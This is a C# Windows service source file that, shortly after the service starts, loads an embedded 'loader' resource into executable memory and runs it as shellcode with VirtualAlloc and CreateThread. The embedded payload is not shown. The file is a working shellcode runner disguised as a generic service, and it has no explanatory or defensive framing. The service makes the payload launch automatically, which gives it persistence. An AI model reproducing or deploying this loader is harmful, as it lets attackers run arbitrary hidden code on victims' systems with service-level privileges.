using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.Runtime;
using System.Timers;
namespace WindowsService1
{
    public partial class Service1 : ServiceBase
    {
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
          UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
          );
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
        public Service1()
        {
            InitializeComponent();
        }
        protected override void OnStart(string[] args)
        {
            Timer timer = new Timer();
            timer.Interval = 1000;
            timer.AutoReset = false;
            timer.Elapsed += new ElapsedEventHandler(this.OnTimer);
            timer.Start();
        }
        protected override void OnStop()
        {
            
        }
        public void OnTimer(object sender, ElapsedEventArgs args)
        {
            byte[] shellcode = GetResource("loader");
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
            MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
        private static byte[] GetResource(string name)
        {
            string resourceFullName = null;
            if ((resourceFullName = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames().FirstOrDefault(N => N.Contains(name))) != null)
            {

                Stream reader = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceFullName);
                byte[] ba = new byte[reader.Length];
                reader.Read(ba, 0, ba.Length);
                return ba;
            }
            return null;
        }
    }
}
